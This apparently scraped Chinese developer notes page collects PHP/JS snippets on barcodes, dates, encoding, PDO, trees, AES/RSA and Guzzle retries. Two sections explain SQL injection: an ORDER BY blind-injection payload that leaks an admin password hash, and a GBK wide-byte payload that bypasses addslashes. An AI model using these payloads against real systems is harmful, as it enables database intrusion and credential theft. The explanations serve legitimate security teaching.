$barcode-&gt;setText("012345678901"); $barcode-&gt;setType(BarcodeGenerator::Upca); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Upce&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("012345"); $barcode-&gt;setType(BarcodeGenerator::Upce); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; &#125;&#125;https://learnku.com/laravel/t/31325 Composer 输入账号密码12345把 composer.lock 文件， vendor 目录删掉。 然后composer global clearcachecomposer clearcache foreach 引用123456789101112131415$array = ['zero', 'one', 'two', 'three'];$value = &amp;$array[3];// foreach 的作用如上// $value 现在是$array[3]的地址$value = 100;// 相当于 $array[3] 的内存地址为 100dump($array);array:4 [▼ 0 =&gt; "zero" 1 =&gt; "one" 2 =&gt; "two" 3 =&gt; &amp; 100] 获取日期数组1234567891011121314151617181920212223function getDateRange($startDate, $endDate)&#123; $startTimeStamp = strtotime($startDate); $endTimeStamp = strtotime($endDate); // 计算日期段内有多少天 $days = ($endTimeStamp-$startTimeStamp) / 86400; // 保存每天日期 $date = array(); for($i=0; $i&lt;$days; $i++)&#123; $date[] = date('Y-m-d', $startTimeStamp+(86400*$i)); &#125; return $date;&#125;$list = getDateRange('2018/01/01', '2018/01/03);/** * $list 如下 * [2018-01-01,2018-01-02,2018-01-03] */ 女神QQ号码1234567891011121314151617181920212223242526272829303132333435363738394041取整=&gt;取余=&gt;取余*10+取整。。。。。取余取整的对象都是10的倍数，根据位数而定，每次取整之后就是一位，循环直到数字等于0。$raw_num = 631758924;$num = 0;$devisor = 1;while($devisor &lt; $raw_num)&#123; $devisor *= 10; //获取最小的大于raw_num的10的倍数的整数https://www.cnblogs.com/iforever/p/4584490.html&#125;while ($raw_num &gt; 0) &#123; $devisor /= 10; $next = floor($raw_num / $devisor); //获取下一个数字 $num = $num*10 + $next; //计算”半成品“QQ号码 $raw_num = $raw_num % $devisor; $last = floor($raw_num * 10 / $devisor); //移动数字，拼接最新的QQ号码 $pre = $raw_num % (ceil($devisor / 10)); $raw_num = $pre * 10 + $last; &#125;echo "恭喜你啦，成功获取QQ号码：&#123;$num&#125;"; //恭喜你啦，成功获取QQ号码：615947283var n = "631758924";var arr = [];var res = [];for(var i=0; i&lt;n.length; i++) &#123; arr.push(n.charAt(i));&#125;while(arr.length) &#123; if(arr.length !== 1) &#123; res.push( arr.shift() ); arr.push( arr.shift() ); &#125; else &#123; res.push( arr.shift() ); &#125;&#125; console.log(res.join('')); //615947283&gt;&gt;&gt; qq = lambda e:len(e)&gt;1 and e[0]+qq(e[2:]+e[1]) or e&gt;&gt;&gt; print qq('631758924')615947283 PHP实现linux命令tail -f1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env php &lt;?phpif(2 != count($argv))&#123; fwrite( STDERR, "调用格式错误！使用格式 ./tail filename".PHP_EOL ); return 1;&#125;//https://www.cnblogs.com/iforever/p/5202197.html$file_name = $argv[1];define("MAX_SHOW", 8192);//当内容长度超过这个阈值的时候，只输出最后面的8192个字节，这样就不会出现大面积的刷新导致看不清的问题$file_size = 0;$file_size_new = 0;$add_size = 0;$ignore_size = 0;$fp = fopen($file_name, "r");while(1)&#123; clearstatcache();//php中获取文件大小之前一定要运行函数clearstatcache()，清除文件状态缓存，否则获取文件大小可能会有偏差 $file_size_new = filesize($file_name); $add_size = $file_size_new - $file_size; if($add_size &gt; 0)&#123; if($add_size &gt; MAX_SHOW)&#123; $ignore_size = $add_size - MAX_SHOW; $add_size = MAX_SHOW; fseek($fp, $file_size + $ignore_size); &#125; fwrite( STDOUT, fread($fp, $add_size) ); $file_size = $file_size_new; &#125; usleep(50000);&#125;fclose($fp); Unicode到UTF-812345678910111213141516171819202122232425262728293031323334353637汉 =&gt; E6B189 =&gt; 11100110 10110001 10001001 =&gt; 01101100 01001001 =&gt; 6C49字 =&gt; E5AD97 =&gt; 11100101 10101101 10010111 =&gt; 01011011 01010111 =&gt; 5B57#下面是在chrome命令行下面运行的结果'\u6C49'"汉"'\u5B57'"字"function utf8_bytes(str)&#123; var len = 0, unicode; for(var i = 0; i &lt; str.length; i++) &#123; unicode = str.charCodeAt(i); if(unicode &lt; 0x0080) &#123; ++len; &#125; else if(unicode &lt; 0x0800) &#123; len += 2; &#125; else if(unicode &lt;= 0xFFFF) &#123; len += 3; &#125;else &#123; throw "characters must be USC-2!!" &#125; &#125; return len;&#125;#例子utf8_bytes('asdasdas')8utf8_bytes('yrt燕睿涛')12#对于GBK字符串https://www.cnblogs.com/iforever/p/4520692.html$len = ceil(strlen(bin2hex(iconv('GBK', 'UTF-8', $word)))/2);#对于UTF8字符串$len = ceil(strlen(bin2hex($word))/2); PDO 防止 sql 注入12345678910111213141516$user=$_POST['user']; $pass=$_POST['pass']; $dbh = new \PDO("mysql:host=localhost; dbname=zz", "root", "root"); $dbh-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, false); //禁用prepared statements的仿真效果// $dbh-&gt;exec ("set names 'utf8'"); $sql="select * from test where user=? and pass=?"; $stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($user, $pass)); if ($exeres) &#123; //while条件为真时,输出$row, while ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC))&#123; print_r($row);die(); &#125; //失败输出登录失败https://learnku.com/articles/27000 print_r("登录失败");die(); &#125; 二进制上传图片123456789101112131415161718192021222324252627282930 $postData=file_get_contents('C:\Users\ASUS\Pictures\Saved Pictures\2.jpg'); $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, 'http://www.think.hk/upload1'); curl_setopt($curl, CURLOPT_USERAGENT,'Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.15'); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // stop verifying certificate curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));//注意加这行代码 curl_setopt($curl, CURLOPT_POSTFIELDS, $postData); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); $r = curl_exec($curl); curl_close($curl); print_r($r);接收二进制 $xmlstr = file_get_contents('php://input') ? file_get_contents('php://input') : gzuncompress($GLOBALS['HTTP_RAW_POST_DATA']);//得到post过来的二进制原始数据//echo $xmlstr;die; $filename=time().'.png'; $info=file_put_contents($filename,$xmlstr); if ($info) &#123; $result = [ 'error' =&gt; '成功', 'url' =&gt; $filename ]; &#125; else &#123; $result = ['error' =&gt; 1, 'message' =&gt; 404 ]; &#125; return json_encode($result); order by 进行盲注12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576$username = $_POST['username'];$password = $_POST['password'];if(filter($username))&#123; //过滤括号&#125;else&#123; $sql="SELECT * FROM admin WHERE username='".$username."'"; $result=mysql_query($sql); @$row = mysql_fetch_array($result); if(isset($row) &amp;&amp; $row['username'] === 'admin')&#123; if ($row['password']===md5($password))&#123; //Login successful &#125;else&#123; die("password error!"); &#125; &#125;else&#123; die("username does not exist!"); &#125;&#125;有下列表：mysql&gt; select * from admin where username='admin';+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 |+----+----------+----------------------------------+1 row in set (0.00 sec)这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误username=' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b&amp;password=1mysql&gt; select * from admin where username='' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b';+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | c4ca4238a0b923820dcc509a6f75849b |+----+----------+----------------------------------+1 row in set (0.00 sec)但是想得到password怎么办0x03 利用order by起飞由登录提示可获取一个bool条件，如何用order by利用这个bool条件mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | 2 | 5 || 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from admin where username='' or 1 union select 1,2,'6' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 || 1 | 2 | 6 |+----+----------+----------------------------------+2 rows in set (0.01 sec)mysql&gt; select * from admin where username='' or 1 union select 1,2,'51' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | 2 | 51 || 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from admin where username='' or 1 union select 1,2,'52' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 || 1 | 2 | 52 |+----+----------+----------------------------------+2 rows in set (0.00 sec)通过逐位判断便可得到password显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order by进行注入。https://p0sec.net/index.php/archives/106/ gbk宽字节注入12345678910111213141516171819$conn = mysql_connect('127.0.0.1','root','xxx'); mysql_select_db('test',$conn);mysql_query("set names gbk"); $id = addslashes($_GET['sql']); $sql = "SELECT username,password FROM admin WHERE id='&#123;$id&#125;'"; echo $sql.'&lt;/br&gt;';if($res = mysql_query($sql))&#123; while($row = mysql_fetch_array($res))&#123; var_dump($row);&#125;&#125;else&#123; echo "Error".mysql_error()."&lt;/br&gt;"; &#125; $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘’，而%27、%20小于ascii(128)的字符就保留了https://p0sec.net/index.php/archives/7/ Composer 加速1234composer global require hirak/prestissimohttps://learnku.com/courses/laravel-package/hirakprestissimo/1695正常使用 Composer 的相关命令即可，会自动生效。 文件下载乱码1234567891011//https://www.helingfeng.com/2018-05-02/php-file-download-garbled/$encoded_filename = urlencode($filename);$encoded_filename = str_replace("+", "%20", $encoded_filename);if (preg_match("/MSIE/", request()-&gt;userAgent())) &#123; header('Content-Disposition: attachment; filename="' . $encoded_filename . '"');&#125; else if (preg_match("/Firefox/", request()-&gt;userAgent())) &#123; header('Content-Disposition: attachment; filename*="utf8\'\'' . $filename . '"');&#125; else &#123; header('Content-Disposition: attachment; filename="' . $filename . '"');&#125; 直接使用 mysql utf8 存储 超过三个字节的 emoji 表情12345678910111213141516171819202122232425262728293031323334353637383940414243由于现在数据的版本是5.5.2，但是看网上说要直接存储emoji表情，需要升级到5.5.3然后把字符集设置为utf8mb4，但是升级数据库感觉属于敏感操作直接找到接受到的文本中的字符串中4个字节的内容，做rawurlencode编码，再入库。输出的时候再替换回来，然后再用rawurldecode转码回unicode到手机再解析为emoji表情。获取字符串长度mb_strlen，按字符来截取字符串mb_substr（mb_strcut是按字节来截取，有区别）。$strEncode = ''; $length = mb_strlen($str,'utf-8'); for ($i=0; $i &lt; $length; $i++) &#123; $_tmpStr = mb_substr($str,$i,1,'utf-8'); if(strlen($_tmpStr) &gt;= 4)&#123; $strEncode .= '[[EMOJI:'.rawurlencode($_tmpStr).']]'; &#125;else&#123; $strEncode .= $_tmpStr; &#125;&#125; echo $strEncode."\n";// 周梦康123~☺[[EMOJI:%F0%9F%98%81]][[EMOJI:%F0%9F%98%84]] //转码回去$strDecode = preg_replace_callback("/\[\[EMOJI:(.*?)\]\]/", function($matches)&#123; return rawurldecode($matches[1]);&#125;, $strEncode); echo $strDecode."\n";第一个坑：我们线上服务器strlen返回的结果不是字节数，而是字符数。我折腾好半天。最后终于找到了原因：http://php.net/manual/zh/mbstring.overload.php再配置文件里设置了mbstring.func_overload=2，而且该配置只能在php.ini里修改，不能通过ini_set来改变。具体参考：http://php.net/manual/en/mbstring.configuration.php; overload(replace) single byte functions by mbstring functions.; mail(), ereg(), etc are overloaded by mb_send_mail(), mb_ereg(),; etc. Possible values are 0,1,2,4 or combination of them.; For example, 7 for overload everything.; 0: No overload; 1: Overload mail() function; 2: Overload str*() functions; 4: Overload ereg*() functions; http://php.net/mbstring.func-overloadmbstring.func_overload = 2这样就导致了str*类的函数都被mb_str*给替换了。具体的参看上面的链接。第二个坑：PHP 5.3.13中对preg_replace_callback不支持 https://mengkang.net/384.html 二分查找12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152https://learnku.com/articles/31829class Elem&#123; public $key;&#125;class Table&#123; public $data = []; public $lenght;&#125;function createTable(Table &amp;$table,$length)&#123; $table-&gt;lenght = $length; $obj = new Elem(); fwrite(STDOUT,"请输入数据：\n"); for($i=1;$i&lt;=$table-&gt;lenght;$i++)&#123; $elem = clone $obj; $elem-&gt;key = fgets(STDIN,10); $table-&gt;data[$i] = $elem; &#125;&#125;function searchBin(Table $table,$key):int&#123; $low = 1; $height = $table-&gt;lenght; while($low&lt;=$height)&#123; $mid = floor(($low+intval($height))/2); if ($table-&gt;data[$mid]-&gt;key==$key)&#123; return $mid; &#125;else if($table-&gt;data[$mid]-&gt;key&gt;$key)&#123; $height=$mid-1; &#125;else&#123; $low = $mid+1; &#125; &#125; return 0;&#125;(function()&#123; $table = new Table(); fwrite(STDOUT,"请输入数据元素个数：\n"); $length = fgets(STDIN,10); createTable($table,$length); fwrite(STDOUT,"请输入要查找的数据元素：\n"); $key = (integer)fgets(STDIN,10); $location = searchBin($table,$key); if ($location)&#123; fwrite(STDOUT,"查找到的数据索引为：$location\n"); &#125;else&#123; fwrite(STDERR,"查找不到指定的内容\n"); &#125;&#125;)(); 无限分类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178$arrs = [ [ 'id'=&gt;1, 'parent_id'=&gt;0 ], [ 'id'=&gt;2, 'parent_id'=&gt;1 ], [ 'id'=&gt;3, 'parent_id'=&gt;2 ], [ 'id'=&gt;4, 'parent_id'=&gt;2 ], [ 'id'=&gt;5, 'parent_id'=&gt;0 ],];var_export(getTree($arrs));function getTree($arrs,$root=0)&#123; $tree = array(); foreach ($arrs as $foo) &#123; if ($foo['parent_id'] == $root) &#123; $foo['children'] = getTree($arrs,$foo['id']); $tree[] = $foo; &#125; &#125; return $tree;&#125;function getTree($arrs,$root=0,$level=100)&#123; $tree = array(); foreach ($arrs as $foo) &#123; if ($foo['parent_id'] == $root) &#123; if($level&gt;0)&#123; $foo['children'] = getTree($arrs,$foo['id'],$level-1); &#125; $tree[] = $foo; &#125; &#125; --$level; return $tree;&#125;/** * 把返回的数据集转换成Tree * * @param $list * @param string $pk * @param string $pid * @param string $child * @param int $root * @return array */ public static function list_to_tree($list, $pk = 'id', $pid = 'pid', $child = '_child', $root = 0) &#123; // 创建Tree $tree = []; if (is_array($list)) &#123; // 创建基于主键的数组引用 $refer = []; foreach ($list as $key =&gt; $data) &#123; $refer[$data[$pk]] = &amp;$list[$key]; &#125; foreach ($list as $key =&gt; $data) &#123; // 判断是否存在parent $parentId = $data[$pid]; if ($root == $parentId) &#123; $tree[] = &amp;$list[$key]; &#125; else &#123; if (isset($refer[$parentId])) &#123; $parent = &amp;$refer[$parentId]; $parent[$child][] = &amp;$list[$key]; &#125; else &#123; $tree[] = &amp;$list[$key]; &#125; &#125; &#125; &#125; return $tree; &#125; 使用模型自带关联关系可以实现无限级 /** * 返回子节点 * @return \Illuminate\Database\Eloquent\Relations\HasMany */ public function children() &#123; return $this-&gt;hasMany(get_class($this),'p_id','id'); &#125; /** * 所有子节点https://learnku.com/laravel/t/31828 * @return \Illuminate\Database\Eloquent\Relations\HasMany */ public function allChildren() &#123; return $this-&gt;children()-&gt;with( 'allChildren' ); &#125; /** * 父节点 * @return \Illuminate\Database\Eloquent\Relations\HasOne */ public function parent() &#123; return $this-&gt;hasOne(get_class($this),'id','p_id'); &#125; https://github.com/lazychaser/laravel-nestedsetfunction getTree($arrs,$root=0,$level=100)&#123; $tree = array(); foreach ($arrs as $foo) &#123; if ($foo['parent_id'] == $root) &#123; if($level&gt;0)&#123; $foo['children'] = getTree($arrs,$foo['id'],$level-1); &#125; $tree[] = $foo; &#125; &#125; --$level; return $tree;&#125; var_export ($arrs,0,0)// 一级 array ( 0 =&gt; array ( 'id' =&gt; 1, 'parent_id' =&gt; 0, ), 1 =&gt; array ( 'id' =&gt; 5, 'parent_id' =&gt; 0, ), ) var_export ($arrs,0,1)// 两级 array ( 0 =&gt; array ( 'id' =&gt; 1, 'parent_id' =&gt; 0, 'children' =&gt; array ( 0 =&gt; array ( 'id' =&gt; 2, 'parent_id' =&gt; 1, ), ), ), 1 =&gt; array ( 'id' =&gt; 5, 'parent_id' =&gt; 0, 'children' =&gt; array ( 0 =&gt; array ( 'id' =&gt; 6, 'parent_id' =&gt; 5, ), ), ), ) php加密123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112AES 加密 / 解密//获取可用的密码加密算法列表//$methods = openssl_get_cipher_methods();//var_dump($methods);# AES加密演示//明文(要加密的内容)$str = "这是测试用例 我是明文";//秘钥(用例:使用uniqid()函数生成了一个唯一ID)$key = "5d3fb4acb2292";//加密算法$method = "AES-128-CBC";//加密向量(要求18个字节)$iv = "1234567812345678";$encrypt_str = openssl_encrypt($str, $method, $key, 0, $iv);var_dump("AES加密结果:".$encrypt_str);# AES解密演示//$encrypt_str AES加密后产生的密文//$key 秘钥(同上)$decrypt_str = openssl_decrypt($encrypt_str, $method, $key, 0, $iv);var_dump("AES解密结果:".$decrypt_str);RSA 加密1.公/私钥加密算法,属于非对称加密:2.优点:极难被破解;3.缺点:速度慢,运算次数多,不适合加密长文本;//公钥(项目中可在线生产亦可自己生成)$PUBLIC_KEY = "-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApJJ7D/U9lHLNQdl4LZSrjNvdCelIraMnSD/iujWxyw/QDLXPCtP06ll42JURGlYaO2DU5c5BKEUF0alyzlE9XiHRXPl0LabI/CjGtrIB4RApy1PjkQ31QOt+9R2Nmb7RUkfZwnCWHBlNVnwj4U6JwoccrlUdElBWU5twFc2PNPbMR6nA/ldUwDpcveNHNp57BrgYfUFcLrjmf2LH6c7XngBNPbG5ha5pmsaXm8MAqBRtAvIwvUsvJLIr+XRc27pCJFe/1MtS4hHhTPE4un/zY/tIrpqm6MimdJcs8oqEQPoztfs5BTNu2jVgrKwtWExDXODWmHemQoaCwzgt3wMy3wIDAQAB-----END PUBLIC KEY-----";//私钥(项目中可在线生产亦可自己生成)$PRIVATE_KEY = "-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCkknsP9T2Ucs1B2XgtlKuM290J6UitoydIP+K6NbHLD9AMtc8K0/TqWXjYlREaVho7YNTlzkEoRQXRqXLOUT1eIdFc+XQtpsj8KMa2sgHhECnLU+ORDfVA6371HY2ZvtFSR9nCcJYcGU1WfCPhTonChxyuVR0SUFZTm3AVzY809sxHqcD+V1TAOly940c2nnsGuBh9QVwuuOZ/YsfpzteeAE09sbmFrmmaxpebwwCoFG0C8jC9Sy8ksiv5dFzbukIkV7/Uy1LiEeFM8Ti6f/Nj+0iumqboyKZ0lyzyioRA+jO1+zkFM27aNWCsrC1YTENc4NaYd6ZChoLDOC3fAzLfAgMBAAECggEAUcCieW7uREwzQr7xQFNWVQbzavUEMZ2W6gEydCYwSBt20pmOXGamh7QioBSNBnQ3W7/igrZPD94Z4ek3Kt6YiaZrBrC00ejEdt8at6791/vbhzIJHgm9B5701nbz3Kg5+5HNzxV2vEalcI0Cle4Z6RSNXtzRMEPQXoAc0ffnZ/tV033zAN4nWb9zeLw03/D0nbcpaYA/WbwqsNiTxbbi0s54oTsaOTMBBAK9oH9H2M5J506iINcKniyMi6i0cf/cQ+tP6VUCOMHdWm/zJmQ5s2eU/2SowSKMXMLIGUH2Q4AXZ2htX4YwvdHGlGA5yPuiMznkFidVcERfbVl9yi54YQKBgQDQYqj2bb0bvD8YuvXxhtdBQrxiX53pZ1sVoh5SMxD+Lq6tpn4UtOJw6tpE7tgONmWRaKCH10fgX5nQoXPJ0Y02qiDyk/TkE0OGiYRTjjkjY3yPkBIz9KRCoIUcwirEfWdzmjFLTq9hiaGo9JXNHcLXOgpAbiQe+qXf9x/waWB/hQKBgQDKLQB9Ep9A6UFlumXaEr971A7HcQI2BsfPkRfCcT1rphnENHCa37o+5i6tTImAXI+aayp9Jpv0rXLbzFbBkdUdUDINulXSsLRTbq3ttbu5c+NG21XW1fvVqf4VYOP7u/l0Z2eBIsg9uLswS3zltTG8ikm+RKhMf1DVPDAOoLmMEwKBgDn0po9a9/Rlx5qmLM7OtMFGwUQO2clXYILEwvATmc9HxncvTfOOV0gWWTxAvUA+qsLlOXhuTGQ/0nSu4pgnusGQUXeF5N8l6Grbhj0C2itYeQUoiZd/m8uX/01/Rwu84O/K25jZOnfDIn3uAFe6xjy7vKwstckT5txCS9S+SgNNAoGAbvLlSr32cUvQXMA+9r7FIHJOLfsBaJ6t9mW8cTNtrm63wym4BfXzImN1iBrxdmTVVbur1IRkn5Cz8JUhoxahqnWBEnGIeZgJTaP2hPXvcCV9uzvQzpYdnrKsQhUq59HPYqcAcSiiVOTUrPswLmsSQVJuh6Dr7xcLSAnAobZoPMsCgYEAsJuY5RcB1sjYortRNsKbKHLiLI93P0MFF46V/343d3BU7TZfETg703Mj2AfOAGTM2p2BkHFri3l+4oigMqprhAp4hNq4KFK2SCjzedrLV7QIgtp/uMZ+q/yhRtiG8kSWlI9c0Un00+KqIwFqfwABl1zOX5QcMa1X7eWSvZ559ko=-----END PRIVATE KEY-----";//待加密明文$data = "这是RSA待加密明文";//用于接收加密后的密文$content_encrypt = ""; # 私钥加密openssl_private_encrypt($data, $content_encrypt, $PRIVATE_KEY, 1);var_dump("私钥加密结果:".$content_encrypt); # 公钥解密https://learnku.com/articles/31841//$content_encrypt 私钥加密后的密文//用于接收解密后的明文$content_decrypt = "";openssl_public_decrypt($content_encrypt, $content_decrypt, $PUBLIC_KEY, 1);var_dump("公钥解密结果:".$content_decrypt);//根军 MD5()函数的不可逆性进行签名校验//首先必须要有 $appKey与$secretKey$appKey = "5d3fb4acb2292";$secretKey = "5d3fb4acb22925d3fb4acb22925d3fb4acb2292";$url = "localhost/text_sig.php";//待传递的参数$params['appKey'] = $appKey;$params['name'] = "张三";$params['age'] = "26";$params['sex'] = "男";$params['root'] = "admin";$params['password'] = "123456";$params['time'] = time();//获取签名$params['sig'] = createSig($params,$secretKey);$param_str = http_build_query($params);$url = $url.'?'.$param_str;var_dump($url);//生成签名function createSig($params,$secretKey)&#123; //对参数进行排序 ksort($params); $str = http_build_query($params); $str .= $secretKey; return md5($str);&#125; 文字生成点阵图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132$font_width = 16; // 单字宽度$font_height = 16; // 单字高度$byteCount = $font_width * $font_height / 8;//一个点阵占的字节数$str=iconv("utf-8","gb2312//IGNORE", "我是大是的大萨法fasf大多数");$n=5;//每一行四个字//所有字的字模$dot = getDot($str,$byteCount);/** * $positions 平面坐标系 * $sections 每一个字模在平面坐标系中的点。（可移动每一个字模的位置） * $spreadSections 所有字模在平面坐标系中的点，是$sections的展开 * */list($positions,$sections,$spreadSections) = getPositionsSections($dot,$byteCount,$n);/** * 输出点阵html字符串 */echo getOutHtml($positions,$sections,$spreadSections,$n);/** * 从字库中获得每一个字的字模 * @param $str * @param $byteCount * @return string */function getDot($str,$byteCount)&#123; $dot=''; $fontFileName = './HZK16';//字库名字 $fp = fopen($fontFileName, "rb"); for ($i=0;$i&lt;strlen($str);$i++)&#123; if(ord($str[$i])&lt;160)&#123;//非汉字 $location=(ord($str&#123;$i&#125;) + 156-1) * $byteCount; &#125;else &#123;//汉字 $qh = ord($str[$i]) - 32 - 128;//区码 $wh = ord($str[++$i]) - 32 - 128;//位码 $location = (94 * ($qh - 1) + ($wh - 1)) * $byteCount; /* 计算汉字字模在文件中的位置 */ &#125; fseek($fp, $location, SEEK_SET);//定位到汉字或字母指针开始的地方 $dot.= fread($fp, $byteCount);//读取32字节的长度，一个字节8位，一行依次放两个字节组成16*16的点阵 &#125; fclose($fp); return $dot;&#125;/** * 建平面按坐标系。并把每一区块用平面坐标系表示 * @param $dot * @param $byteCount * @param $n * @return array */function getPositionsSections($dot,$byteCount,$n)&#123; $count= strlen($dot)/$byteCount;//多少个字 $positions=[]; $sections =[]; $sectionCount=$count; for ($i=0;$i&lt;$sectionCount;$i++)&#123; $sections[]=[]; &#125; $yHeight=(intval($count/$n)*16+16); $xWeight=16*$n; for ($i=0;$i&lt;$yHeight;$i++)&#123; for ($j=0;$j&lt;$xWeight;$j++)&#123; $positions []=[$j,$i]; $x=ceil(($j+1)/16); $y=ceil(($i+1)/16); $y--; $x--; $sections[(($y)*$n+$x)][] = [$j,$i]; &#125; &#125; for ($b=0;$b&lt;$count;$b++)&#123;//每一个字占用的点阵 $str = substr($dot,($b)*32,$byteCount);//第几个字 $dot_string=''; for ($c = 0; $c &lt; $byteCount; $c++)&#123; $dot_string .= sprintf("%08b", ord($str[$c])); if ($c % 2 == 1) &#123; for($a=0;$a&lt;strlen($dot_string);$a++)&#123; if($dot_string[$a])&#123;//和平面坐标系关联起来 $sections[$b][intval(16*floor($c/2)+$a)][]=1; &#125; &#125; $dot_string = ''; &#125; &#125; &#125; $spreadSections=[];//每一个字块的的点展开到数组中 foreach ($sections as $section)&#123; $spreadSections = array_merge($spreadSections,$section); &#125; return [$positions,$sections,$spreadSections,$count,$sectionCount];&#125;function getOutHtml($positions,$sections,$spreadSections,$n)&#123; $str="&lt;html&gt;&lt;body&gt;&lt;table border='1' width='100%' style='text-align: center'&gt;"; foreach (array_chunk($positions,16*$n) as $row)&#123; $str.=getOutRow($row,$sections,$spreadSections); &#125; $str .= "&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"; return $str;&#125;function getOutRow($row,$sections,$spreadSections)&#123; $str="&lt;tr&gt;"; foreach ($row as $td) &#123; if (!in_array($td,$spreadSections))&#123;//不在平面坐标系中说明这个位置是一个点 $str .= "&lt;td style='color: white;background-color: red;'&gt;O&lt;/td&gt;"; &#125;else &#123; $str .= "&lt;td&gt;O&lt;/td&gt;"; &#125; &#125; $str.="&lt;tr&gt;"; return $str;&#125;https://learnku.com/articles/31882 Guzzle 中间件进行优雅的请求重试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778use GuzzleHttp\Psr7\Request;use GuzzleHttp\Psr7\Response;use GuzzleHttp\Client;use GuzzleHttp\Exception\ConnectException;use GuzzleHttp\Exception\RequestException;use GuzzleHttp\Handler\CurlHandler;use GuzzleHttp\HandlerStack;use GuzzleHttp\Middleware;class TestGuzzleRetry&#123; /** * 最大重试次数 */ const MAX_RETRIES = 5; /** * @var Client */ protected $client; /** * GuzzleRetry constructor. */ public function __construct() &#123; // 创建 Handler $handlerStack = HandlerStack::create(new CurlHandler()); // 创建重试中间件，指定决策者为 $this-&gt;retryDecider(),指定重试延迟为 $this-&gt;retryDelay() $handlerStack-&gt;push(Middleware::retry($this-&gt;retryDecider(), $this-&gt;retryDelay())); // 指定 handler $this-&gt;client = new Client(['handler' =&gt; $handlerStack]); &#125; /** * retryDecider * 返回一个匿名函数, 匿名函数若返回false 表示不重试，反之则表示继续重试 * @return Closure */ protected function retryDecider() &#123; return function ( $retries, Request $request, Response $response = null, RequestException $exception = null ) &#123; // 超过最大重试次数，不再重试 if ($retries &gt;= self::MAX_RETRIES) &#123; return false; &#125; // 请求失败，继续重试 if ($exception instanceof ConnectException) &#123; return true; &#125; if ($response) &#123; // 如果请求有响应，但是状态码大于等于500，继续重试(这里根据自己的业务而定) if ($response-&gt;getStatusCode() &gt;= 500) &#123; return true; &#125; &#125; return false; &#125;; &#125; /** * 返回一个匿名函数，该匿名函数返回下次重试的时间（毫秒）https://learnku.com/articles/31855 * @return Closure */ protected function retryDelay() &#123; return function ($numberOfRetries) &#123; return 1000 * $numberOfRetries; &#125;; &#125;&#125; 二进制运算符按位与 &amp;12345678910111213141516171819202122爱好： 篮球 ☑ 足球 ☑ 羽毛球 ☑在数据库中的存储有一下 2 种思路：1 定义一个字段 hobby tinyint 1 篮球 2 足球 3 羽毛球 4 篮球 + 足球 5 篮球 + 羽毛球 6 篮球 + 羽毛球 7 足球 + 羽毛球 8 篮球 + 足球 + 羽毛球即：把这三个选项进行排列组合找出每种情况进行存储这样做可以满足业务的需求，但是如果要是将来再添加一个选项的话，那么将是一场灾难。2 使用 php 中的 &amp; 运算符 按位与运算符定义如下2 篮球 4 足球 8 羽毛球数据库中的 hobby 字段存储的就是选择后的和，这样在进行编辑或者获取这个用户的爱好的时候只要做一次按位与 &amp; 